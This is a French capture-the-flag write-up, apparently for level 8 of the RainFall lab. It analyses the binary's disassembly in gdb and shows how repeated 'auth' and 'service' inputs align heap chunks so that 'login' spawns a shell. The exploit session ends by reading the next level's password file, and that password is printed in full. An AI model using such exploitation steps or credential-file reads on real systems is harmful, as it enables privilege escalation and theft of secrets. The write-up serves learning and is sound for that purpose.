@@ -1,0 +1,122 @@
+#LEVEL 8
+
+Nous lancons notre binaire et un prompt apparait, peu importe ce que nous
+entrons, (nil), (nil) nous est renvoye.
+
+Un petit coup de gdb, mais qu'est ce que ca veut dire ca.
+Nous allons d'abbord regarder ce que contiennent toutes les variables en dur:
+
+<auth> et <service> deux chaines de char vides:
+   0x08048575 <+17>:	mov    0x8049ab0,%ecx
+   0x0804857b <+23>:	mov    0x8049aac,%edx
+
+Format specifier "%p, %p \n":
+   0x08048581 <+29>:	mov    $0x8048810,%eax
+
+Stdin pour fgets:
+   0x08048596 <+50>:	mov    0x8049a80,%eax
+
+Appel system a /bin/sh:
+   0x080486ee <+394>:	movl   $0x8048833,(%esp)
+   0x080486f5 <+401>:	call   0x8048480 <system@plt>
+
+Contient "reset":
+   0x08048648 <+228>:	mov    $0x804881f,%eax
+
+Contient "login":
+   0x080486bb <+343>:	mov    $0x804882d,%eax
+
+Contient "Password: \n";
+   0x08048706 <+418>:	mov    $0x804883b,%eax
+
+C'est a peu pres tout, maintenant on voit qu'il est possible de lancer un shell,
+c'est parfait c'est ce qu'il nous faut, voyons voir comment nous allons
+pouvoir proceder maintenant.
+
+   0x080486e2 <+382>:	mov    0x8049aac,%eax
+   0x080486e7 <+387>:	mov    0x20(%eax),%eax
+   0x080486ea <+390>:	test   %eax,%eax
+   0x080486ec <+392>:	je     0x80486ff <main+411>
+   0x080486ee <+394>:	movl   $0x8048833,(%esp)
+   0x080486f5 <+401>:	call   0x8048480 <system@plt>
+
+Une comparaison est effectuee via test qui effectue un ET logique sur notre eax
+qui a ce moment precis contient <auth> et ce qui se trouve a eax + 0x20.
+Si le resultat est 0 il ne lancera pas notre shell.
+
+(var sera utilier ici pour designer une quelconque chaine de charactere)
+Tres bien, apres avoir tester toutes les valeurs trouver precedemment on commence
+a comprendre le fonctionnement du binaire, le format specifier nous mettant sur
+la piste avec le %p:
+	- lorsque l'on entre 'auth' + var, une adresse nous est affichee et
+	celle-ci s'incremente de 0x10 lorsque que l'on retape auth + var.
+	- de meme pour 'service' mais cette fois-ci c'est la variable de droite qui
+	s'incremente de 0x10 lors qu'elle est retaper.
+	- lorsque l'on tape 'login', apparait a notre ecran "Password: \n", mais
+	rien de special ne se passe en ecrivant apres.
+	- en tapant reset nous n'avons rien constater de special, mis a part le fait
+	qu'il y ai un double free qui est effectue et donc nous fais crash si l'on
+	entre reset 2x d'affilee.
+
+A noter que, l'adresse qui s'incremente, que cela soit a en tapant auth ou
+service est la meme, elle s'incremente de 0x10 puis s'update a droite ou gauche
+en fonction de notre input, auth ou service, voici un apercu:
+
+	level8@RainFall:~$ ./level8
+	(nil), (nil)
+	auth service
+	0x804a008, (nil)
+	service
+	0x804a008, 0x804a018
+	auth ok
+	0x804a028, 0x804a018
+
+Nous nous apercevons qu'a ces adresses, sont ecrit les arguments envoyer avec
+auth et service, a la facons de commandes, exemple:
+
+(gdb) run
+Starting program: /home/user/level8/level8
+(nil), (nil)
+auth salut
+0x804a008, (nil)
+service good
+0x804a008, 0x804a018
+login
+
+Breakpoint 1, 0x080486e2 in main ()
+(gdb) x/s 0x804a008
+0x804a008:	 "salut\n"
+(gdb) x/s 0x804a018
+0x804a018:	 " good\n"
+
+
+Recapitulons, pour etre plus clair car c'est plie peser emballer.
+Nous avons notre programme, qui lorsqu'il recoit  auth + argument ecrit a une
+certaine adresse l'argument. Lorsque l'on reecrit auth + argument il incremente
+l'adresse de 16 octets et ecrit a cette adresse-ci l'argument.
+
+Il en est de meme pour service + argument.
+
+Pour pouvoir lancer notre shell, il faut que l'adresse situe a $eax + 0x20
+pointe sur quelque chose pour passer le test %eax,%eax et lancer notre shell.
+
+Sachant desormais que l'on peut ecrire sur des adresse grace a notre programme
+nous n'avons qu'a initialiser auth, puis incrementer de 32 octets service pour
+pouvoir ecrire dessus et lancer login en passant la verification avec succes
+qui lancera notre shell.
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth salut
+0x804a008, (nil)           <--------- init auth
+service good
+0x804a008, 0x804a018	   <--------- service + 0x10
+service good
+0x804a008, 0x804a028	   <--------- service + 0x20, write good at the adress
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+Caracara, carapuce.
